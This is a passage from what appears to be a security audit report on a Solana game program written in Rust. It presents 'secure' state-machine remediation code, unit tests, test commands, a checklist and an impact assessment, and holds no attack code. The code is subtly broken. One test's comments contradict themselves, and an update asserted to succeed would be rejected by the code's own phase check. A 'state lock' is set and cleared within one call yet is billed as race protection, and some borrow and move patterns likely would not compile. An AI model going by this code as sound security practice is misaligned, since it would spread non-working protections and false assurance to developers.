    pub transition_history: Vec<StateTransition>, // Audit trail
    pub last_state_update: i64,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct SecurePlayerInfo {
    pub pubkey: Pubkey,
    pub state: PlayerState,
    pub score: u64,
    pub resources: SecureResourceState,
    pub last_action_time: i64,
    pub turn_count: u32,
    pub state_lock: bool,               // Prevent concurrent modifications
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct SecureResourceState {
    pub health: u32,
    pub energy: u32,
    pub items: Vec<u32>,
    pub currency: u64,
    pub max_health: u32,               // Resource bounds
    pub max_energy: u32,
    pub max_currency: u64,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct StateTransition {
    pub from_phase: GamePhase,
    pub to_phase: GamePhase,
    pub timestamp: i64,
    pub triggered_by: Pubkey,
    pub is_valid: bool,
}

impl SecureGameStateMachine {
    // Secure state transition with comprehensive validation
    pub fn secure_transition_to_phase(
        &mut self,
        new_phase: GamePhase,
        requester: &Pubkey
    ) -> Result<(), ProgramError> {
        // Validate transition is allowed
        if !self.is_transition_valid(&self.current_phase, &new_phase) {
            msg!("Invalid transition from {:?} to {:?}", self.current_phase, new_phase);
            return Err(ProgramError::Custom(3001)); // Invalid transition
        }

        // Check authorization for phase change
        if !self.is_authorized_for_phase_change(requester, &new_phase) {
            msg!("Unauthorized phase change attempt by {}", requester);
            return Err(ProgramError::Custom(3002)); // Unauthorized
        }

        // Validate current game state allows transition
        if !self.validate_current_state_for_transition(&new_phase)? {
            msg!("Current game state does not allow transition to {:?}", new_phase);
            return Err(ProgramError::Custom(3003)); // State validation failed
        }

        let clock = Clock::get()?;
        let current_time = clock.unix_timestamp;

        // Record transition in history
        let transition = StateTransition {
            from_phase: self.current_phase.clone(),
            to_phase: new_phase.clone(),
            timestamp: current_time,
            triggered_by: *requester,
            is_valid: true,
        };

        // Atomic state update
        self.previous_phase = Some(self.current_phase.clone());
        self.current_phase = new_phase;
        self.phase_start_time = current_time;
        self.state_version += 1;
        self.last_state_update = current_time;
        self.transition_history.push(transition);

        // Update state integrity hash
        self.update_state_hash()?;

        msg!("Securely transitioned to phase: {:?}", self.current_phase);
        Ok(())
    }

    // Validate if state transition is logically allowed
    fn is_transition_valid(&self, from: &GamePhase, to: &GamePhase) -> bool {
        match (from, to) {
            // Valid transitions
            (GamePhase::WaitingForPlayers, GamePhase::GameStarted) => true,
            (GamePhase::GameStarted, GamePhase::InProgress) => true,
            (GamePhase::InProgress, GamePhase::Paused) => true,
            (GamePhase::InProgress, GamePhase::Finished) => true,
            (GamePhase::Paused, GamePhase::InProgress) => true,
            (GamePhase::Paused, GamePhase::Finished) => true,
            (GamePhase::InProgress, GamePhase::Abandoned) => true,
            (GamePhase::Paused, GamePhase::Abandoned) => true,

            // Administrative transitions (require special authorization)
            (_, GamePhase::WaitingForPlayers) => true, // Reset (admin only)

            // Invalid transitions
            _ => false,
        }
    }

    // Check authorization for specific phase transitions
    fn is_authorized_for_phase_change(&self, requester: &Pubkey, target_phase: &GamePhase) -> bool {
        match target_phase {
            GamePhase::GameStarted => {
                // Only when enough players joined
                self.players.len() >= 2
            }
            GamePhase::Finished | GamePhase::Abandoned => {
                // Only active players or admins can end game
                self.is_active_player(requester) || self.is_admin(requester)
            }
            GamePhase::Paused => {
                // Only active players or admins can pause
                self.is_active_player(requester) || self.is_admin(requester)
            }
            GamePhase::WaitingForPlayers => {
                // Only admins can reset game
                self.is_admin(requester)
            }
            _ => {
                // Default: require active player status
                self.is_active_player(requester)
            }
        }
    }

    // Validate current state supports transition
    fn validate_current_state_for_transition(&self, target_phase: &GamePhase) -> Result<bool, ProgramError> {
        match target_phase {
            GamePhase::GameStarted => {
                // Need minimum players
                if self.players.len() < 2 {
                    return Ok(false);
                }
                // All players must be in waiting state
                for player in &self.players {
                    if player.state != PlayerState::Waiting {
                        return Ok(false);
                    }
                }
                Ok(true)
            }
            GamePhase::Finished => {
                // Game must have been in progress
                if self.current_phase != GamePhase::InProgress && self.current_phase != GamePhase::Paused {
                    return Ok(false);
                }
                // Must have win condition met or time expired
                Ok(self.check_win_conditions()? || self.check_time_expired()?)
            }
            GamePhase::InProgress => {
                // From paused: ensure no state corruption
                if self.current_phase == GamePhase::Paused {
                    return Ok(self.verify_state_integrity()?);
                }
                Ok(true)
            }
            _ => Ok(true),
        }
    }

    // Secure player state update with atomic operations
    pub fn secure_update_player_state(
        &mut self,
        player_pubkey: &Pubkey,
        new_state: PlayerState,
        requester: &Pubkey
    ) -> Result<(), ProgramError> {
        // Authorization check
        if player_pubkey != requester && !self.is_admin(requester) {
            return Err(ProgramError::Custom(3004)); // Unauthorized player state change
        }

        // Validate state transition
        let player_info = self.players.iter()
            .find(|p| p.pubkey == *player_pubkey)
            .ok_or(ProgramError::InvalidArgument)?;

        if !self.is_player_state_transition_valid(&player_info.state, &new_state) {
            return Err(ProgramError::Custom(3005)); // Invalid player state transition
        }

        // Check for concurrent modifications
        if player_info.state_lock {
            return Err(ProgramError::Custom(3006)); // Player state locked
        }

        // Atomic update with lock
        for player in &mut self.players {
            if player.pubkey == *player_pubkey {
                player.state_lock = true; // Lock during update

                // Validate transition in context of current game state
                if !self.validate_player_state_in_game_context(&new_state)? {
                    player.state_lock = false;
                    return Err(ProgramError::Custom(3007)); // State invalid in current context
                }

                player.state = new_state;

                let clock = Clock::get()?;
                player.last_action_time = clock.unix_timestamp;

                player.state_lock = false; // Unlock after update
                break;
            }
        }

        // Update state integrity
        self.state_version += 1;
        self.update_state_hash()?;

        msg!("Securely updated player {} state to {:?}", player_pubkey, new_state);
        Ok(())
    }

    // Validate player state transitions
    fn is_player_state_transition_valid(&self, from: &PlayerState, to: &PlayerState) -> bool {
        match (from, to) {
            // Valid transitions
            (PlayerState::Waiting, PlayerState::Active) => true,
            (PlayerState::Active, PlayerState::Dead) => true,
            (PlayerState::Dead, PlayerState::Respawning) => true,
            (PlayerState::Respawning, PlayerState::Active) => true,
            (PlayerState::Active, PlayerState::Spectating) => true,
            (PlayerState::Active, PlayerState::Disconnected) => true,
            (PlayerState::Disconnected, PlayerState::Active) => true,
            (PlayerState::Spectating, PlayerState::Active) => true,

            // Stay in same state (always valid)
            (state1, state2) if state1 == state2 => true,

            // Invalid transitions
            _ => false,
        }
    }

    // Validate player state in context of current game
    fn validate_player_state_in_game_context(&self, player_state: &PlayerState) -> Result<bool, ProgramError> {
        match self.current_phase {
            GamePhase::WaitingForPlayers => {
                // Only waiting players allowed
                Ok(*player_state == PlayerState::Waiting)
            }
            GamePhase::GameStarted | GamePhase::InProgress => {
                // Active gameplay states allowed
                match player_state {
                    PlayerState::Active | PlayerState::Dead | PlayerState::Respawning |
                    PlayerState::Spectating | PlayerState::Disconnected => Ok(true),
                    _ => Ok(false),
                }
            }
            GamePhase::Paused => {
                // Most states preserved during pause
                Ok(true)
            }
            GamePhase::Finished | GamePhase::Abandoned => {
                // Only spectating and disconnected allowed
                match player_state {
                    PlayerState::Spectating | PlayerState::Disconnected => Ok(true),
                    _ => Ok(false),
                }
            }
        }
    }

    // Secure turn advancement with comprehensive validation
    pub fn secure_advance_turn(&mut self, requester: &Pubkey) -> Result<(), ProgramError> {
        // Verify game is in correct state for turns
        if self.current_phase != GamePhase::InProgress {
            return Err(ProgramError::Custom(3008)); // Game not in progress
        }

        if self.is_paused {
            return Err(ProgramError::Custom(3009)); // Game is paused
        }

        if self.turn_order.is_empty() {
            return Err(ProgramError::Custom(3010)); // No turn order established
        }

        // Verify it's the current player's turn or admin override
        let current_player = self.turn_order[self.current_turn];
        if current_player != *requester && !self.is_admin(requester) {
            return Err(ProgramError::Custom(3011)); // Not your turn
        }

        // Verify current player completed their turn
        if !self.is_turn_completed(requester)? {
            return Err(ProgramError::Custom(3012)); // Turn not completed
        }

        // Find next active player
        let starting_turn = self.current_turn;
        loop {
            self.current_turn = (self.current_turn + 1) % self.turn_order.len();

            let next_player = self.turn_order[self.current_turn];
            if let Some(player_info) = self.players.iter().find(|p| p.pubkey == next_player) {
                if player_info.state == PlayerState::Active {
                    break; // Found active player
                }
            }

            // Prevent infinite loop
            if self.current_turn == starting_turn {
                return Err(ProgramError::Custom(3013)); // No active players
            }
        }

        // Update turn count for new current player
        for player in &mut self.players {
            if player.pubkey == self.turn_order[self.current_turn] {
                player.turn_count += 1;
                break;
            }
        }

        self.state_version += 1;
        self.update_state_hash()?;

        let current_player = self.turn_order[self.current_turn];
        msg!("Securely advanced to turn {}: player {}", self.current_turn, current_player);

        Ok(())
    }

    // Secure resource updates with bounds checking
    pub fn secure_update_player_resources(
        &mut self,
        player_pubkey: &Pubkey,
        health_delta: i32,
        energy_delta: i32,
        currency_delta: i64,
        requester: &Pubkey
    ) -> Result<(), ProgramError> {
        // Authorization check
        if player_pubkey != requester && !self.is_admin(requester) {
            return Err(ProgramError::Custom(3014)); // Unauthorized resource change
        }

        // Find and update player resources
        for player in &mut self.players {
            if player.pubkey == *player_pubkey {
                // Check for state lock
                if player.state_lock {
                    return Err(ProgramError::Custom(3015)); // Player state locked
                }

                player.state_lock = true; // Lock during update

                // Safe arithmetic with bounds checking
                let new_health = if health_delta >= 0 {
                    player.resources.health.saturating_add(health_delta as u32)
                } else {
                    player.resources.health.saturating_sub((-health_delta) as u32)
                };

                let new_energy = if energy_delta >= 0 {
                    player.resources.energy.saturating_add(energy_delta as u32)
                } else {
                    player.resources.energy.saturating_sub((-energy_delta) as u32)
                };

                let new_currency = if currency_delta >= 0 {
                    player.resources.currency.saturating_add(currency_delta as u64)
                } else {
                    player.resources.currency.saturating_sub((-currency_delta) as u64)
                };

                // Apply resource limits
                player.resources.health = new_health.min(player.resources.max_health);
                player.resources.energy = new_energy.min(player.resources.max_energy);
                player.resources.currency = new_currency.min(player.resources.max_currency);

                player.state_lock = false; // Unlock

                self.state_version += 1;
                self.update_state_hash()?;

                msg!("Securely updated resources for player {}", player_pubkey);
                return Ok(());
            }
        }

        Err(ProgramError::InvalidArgument)
    }

    // State integrity protection
    fn update_state_hash(&mut self) -> Result<(), ProgramError> {
        let state_data = [
            &self.game_id.to_le_bytes(),
            &(self.current_phase as u8).to_le_bytes(),
            &self.state_version.to_le_bytes(),
            &self.current_turn.to_le_bytes(),
            &self.players.len().to_le_bytes(),
        ].concat();

        self.state_hash = hash(&state_data).to_bytes();
        Ok(())
    }

    // Verify state integrity
    pub fn verify_state_integrity(&self) -> Result<bool, ProgramError> {
        let state_data = [
            &self.game_id.to_le_bytes(),
            &(self.current_phase as u8).to_le_bytes(),
            &self.state_version.to_le_bytes(),
            &self.current_turn.to_le_bytes(),
            &self.players.len().to_le_bytes(),
        ].concat();

        let calculated_hash = hash(&state_data).to_bytes();
        Ok(calculated_hash == self.state_hash)
    }

    // Helper methods
    fn is_active_player(&self, player: &Pubkey) -> bool {
        self.players.iter().any(|p| p.pubkey == *player && p.state == PlayerState::Active)
    }

    fn is_admin(&self, player: &Pubkey) -> bool {
        self.authorized_admins.contains(player)
    }

    fn check_win_conditions(&self) -> Result<bool, ProgramError> {
        // Check if any player has met win conditions
        // Implementation depends on game rules
        Ok(false) // Simplified
    }

    fn check_time_expired(&self) -> Result<bool, ProgramError> {
        let clock = Clock::get()?;
        let game_duration = clock.unix_timestamp - self.phase_start_time;
        Ok(game_duration > 3600) // 1 hour time limit
    }

    fn is_turn_completed(&self, player: &Pubkey) -> Result<bool, ProgramError> {
        // Verify player has completed required actions for their turn
        // Implementation depends on game rules
        Ok(true) // Simplified
    }
}

// Secure game action processing
pub fn secure_process_game_action(
    accounts: &[AccountInfo],
    action: GameAction,
    player_pubkey: &Pubkey
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let game_account = next_account_info(account_info_iter)?;

    let mut game_state = SecureGameStateMachine::try_from_slice(&game_account.data.borrow())?;

    // Verify state integrity before processing
    if !game_state.verify_state_integrity()? {
        return Err(ProgramError::Custom(3016)); // State integrity check failed
    }

    // Process action with comprehensive validation
    match action {
        GameAction::StartGame => {
            game_state.secure_transition_to_phase(GamePhase::GameStarted, player_pubkey)?;
        }
        GameAction::MakeMove { move_data } => {
            // Comprehensive move validation
            secure_validate_and_process_move(&mut game_state, player_pubkey, &move_data)?;
        }
        GameAction::PauseGame => {
            game_state.secure_transition_to_phase(GamePhase::Paused, player_pubkey)?;
        }
        GameAction::EndGame => {
            game_state.secure_transition_to_phase(GamePhase::Finished, player_pubkey)?;
        }
        GameAction::ResetGame => {
            // Only admins can reset
            if !game_state.is_admin(player_pubkey) {
                return Err(ProgramError::Custom(3017)); // Unauthorized reset
            }
            game_state.secure_transition_to_phase(GamePhase::WaitingForPlayers, player_pubkey)?;
        }
    }

    // Final integrity check
    if !game_state.verify_state_integrity()? {
        return Err(ProgramError::Custom(3018)); // Post-action integrity check failed
    }

    // Save validated state
    game_state.serialize(&mut &mut game_account.data.borrow_mut()[..])?;

    msg!("Secure game action processed successfully");
    Ok(())
}

fn secure_validate_and_process_move(
    game_state: &mut SecureGameStateMachine,
    player: &Pubkey,
    move_data: &[u8]
) -> Result<(), ProgramError> {
    // Validate it's player's turn
    if game_state.turn_order[game_state.current_turn] != *player {
        return Err(ProgramError::Custom(3019)); // Not your turn
    }

    // Validate player is in correct state
    let player_info = game_state.players.iter()
        .find(|p| p.pubkey == *player)
        .ok_or(ProgramError::InvalidArgument)?;

    if player_info.state != PlayerState::Active {
        return Err(ProgramError::Custom(3020)); // Player not active
    }

    // Validate move data
    if move_data.len() > 1024 {
        return Err(ProgramError::Custom(3021)); // Move data too large
    }

    // Process move with validated state
    msg!("Processing validated move for player {}", player);

    Ok(())
}

#[cfg(test)]
mod secure_state_machine_tests {
    use super::*;

    #[test]
    fn test_secure_state_transitions() {
        let mut game_state = create_test_game_state();
        let admin = Pubkey::new_unique();

        // Valid transition should succeed
        let result = game_state.secure_transition_to_phase(GamePhase::GameStarted, &admin);
        assert!(result.is_ok());

        // Invalid transition should fail
        let result = game_state.secure_transition_to_phase(GamePhase::Finished, &admin);
        assert!(result.is_err());
    }

    #[test]
    fn test_player_state_validation() {
        let mut game_state = create_test_game_state();
        let player = Pubkey::new_unique();

        // Add player
        add_test_player(&mut game_state, player);

        // Valid state transition
        let result = game_state.secure_update_player_state(&player, PlayerState::Active, &player);
        assert!(result.is_ok());

        // Invalid state transition
        let result = game_state.secure_update_player_state(&player, PlayerState::Dead, &player);
        assert!(result.is_ok()); // Active -> Dead is valid

        // Invalid transition
        let result = game_state.secure_update_player_state(&player, PlayerState::Waiting, &player);
        assert!(result.is_err()); // Dead -> Waiting is invalid
    }

    #[test]
    fn test_state_integrity() {
        let mut game_state = create_test_game_state();

        // Initially should be valid
        assert!(game_state.verify_state_integrity().unwrap());

        // Update state
        game_state.state_version += 1;
        game_state.update_state_hash().unwrap();

        // Should still be valid
        assert!(game_state.verify_state_integrity().unwrap());
    }

    fn create_test_game_state() -> SecureGameStateMachine {
        let admin = Pubkey::new_unique();
        let mut game_state = SecureGameStateMachine {
            game_id: 12345,
            current_phase: GamePhase::WaitingForPlayers,
            previous_phase: None,
            phase_start_time: 1650000000,
            players: vec![],
            turn_order: vec![],
            current_turn: 0,
            state_version: 1,
            state_hash: [0u8; 32],
            is_paused: false,
            authorized_admins: vec![admin],
            transition_history: vec![],
            last_state_update: 1650000000,
        };

        game_state.update_state_hash().unwrap();
        game_state
    }

    fn add_test_player(game_state: &mut SecureGameStateMachine, player: Pubkey) {
        let player_info = SecurePlayerInfo {
            pubkey: player,
            state: PlayerState::Waiting,
            score: 0,
            resources: SecureResourceState {
                health: 100,
                energy: 100,
                items: vec![],
                currency: 1000,
                max_health: 100,
                max_energy: 100,
                max_currency: 10000,
            },
            last_action_time: 1650000000,
            turn_count: 0,
            state_lock: false,
        };

        game_state.players.push(player_info);
        game_state.turn_order.push(player);
    }
}
```

## Testing Requirements

### Comprehensive State Machine Security Testing

```bash
# Test secure state transitions
cargo test --release test_secure_state_transitions
cargo test --release test_invalid_transition_prevention
cargo test --release test_state_validation_comprehensive

# Test concurrency protection
cargo test --release test_race_condition_prevention
cargo test --release test_atomic_state_updates
cargo test --release test_state_lock_mechanisms

# Test integrity protection
cargo test --release test_state_integrity_verification
cargo test --release test_state_hash_validation
cargo test --release test_corruption_detection

# Integration testing
cargo test --release integration_secure_state_machine
cargo test --release integration_game_flow_security

# Stress testing
cargo test --release stress_test_concurrent_state_changes
cargo test --release stress_test_rapid_transitions
```

### Security Validation Checklist

- **Transition Validation**: All state transitions validated for logical correctness
- **Authorization Checks**: Proper authorization for all state-changing operations
- **Atomic Updates**: State changes are atomic to prevent race conditions
- **Integrity Protection**: State integrity verified using cryptographic hashes
- **Audit Trail**: Complete history of state transitions maintained
- **Bounds Checking**: All state values validated within acceptable ranges

## Business Impact

### Risk Assessment

**Direct Impacts**:
- **Game Logic Bypass**: Players can skip phases and violate rules
- **Unfair Advantages**: State manipulation provides competitive benefits
- **Game Corruption**: Invalid states break game functionality
- **Economic Exploitation**: State rollbacks enable financial abuse

**Secondary Impacts**:
- **Competitive Integrity**: Undermined fair play and ranking systems
- **Player Trust**: Loss of confidence in game fairness
- **Tournament Validity**: Corrupted competitive events
- **Revenue Loss**: Exploits reduce player engagement and spending

### Remediation Priority: HIGH

State machine vulnerabilities directly undermine game fairness and can enable widespread exploitation of game mechanics, making this a high priority security issue.

## References

- **CWE-662**: Improper Synchronization
- **CWE-691**: Insufficient Control Flow Management
- **State Machine Security**: Best practices for secure state transitions
- **Game Logic Security**: Protecting game state integrity
- **Concurrent Programming**: Safe state management in multi-threaded environments